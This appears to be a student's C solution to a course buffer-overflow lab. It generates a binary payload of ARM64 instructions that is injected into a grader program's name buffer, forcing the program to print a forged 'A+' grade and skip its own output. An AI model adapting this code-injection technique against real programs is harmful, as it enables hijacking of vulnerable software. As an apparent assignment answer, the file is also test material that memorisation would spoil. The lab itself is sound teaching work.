
/* Ben Zhou and Owen Clarke*/

#include <stdio.h>
#include "miniassembler.h"
#include <string.h>

int main(void) {
    FILE *f = fopen("dataAplus", "w");
    if (!f) {
        perror("fopen dataAplus");
        return 1;
    }

    /* Grader addresses (replace SKIP_ADDR with the address just after the grader's final printf) */
    const unsigned long NAME_ADDR = 0x420058UL;
    const unsigned long SKIP_ADDR = 0x4008c4UL;  /* <- adjust this */
    const unsigned int SVC_INST = 0xd4000001;    /* encoding for `svc #0` */

    /* The exact message to print */
    const char *msg = "A+ is your grade\nThank you, BZOC\n";
    unsigned int msglen = (unsigned int)strlen(msg);

    unsigned long pc = NAME_ADDR + 28;  /* stub starts at name[] at runtime */
    unsigned int instr;
    int i;

    /* 1) write(1, msg, msglen) syscall */
    instr = MiniAssembler_mov(8, 64);               /* w8 = 64 (write) */
    fwrite(&instr, 4, 1, f);  pc += 4;
    instr = MiniAssembler_mov(0, 1);                /* w0 = 1 (stdout) */
    fwrite(&instr, 4, 1, f);  pc += 4;
    instr = MiniAssembler_adr(1, NAME_ADDR + 48, pc); /* x1 = &msg */
    fwrite(&instr, 4, 1, f);  pc += 4;
    instr = MiniAssembler_mov(2, msglen);           /* w2 = msglen */
    fwrite(&instr, 4, 1, f);  pc += 4;
    fwrite(&SVC_INST, 4, 1, f);  /* svc #0 */      pc += 4;

    /* 2) branch past grader's own prints */
    instr = MiniAssembler_b(SKIP_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 3) pad the rest of the 48-byte stub with zeroes */
    {
        int stub_size = (int)(pc - (NAME_ADDR + 28));
        int pad = 48 - stub_size;
        for (i = 0; i < pad; i++) {
            fputc('\0', f);
        }
    }

    /* 4) append the message bytes */
    fwrite(msg, 1, msglen, f);

    fclose(f);
    return 0;
}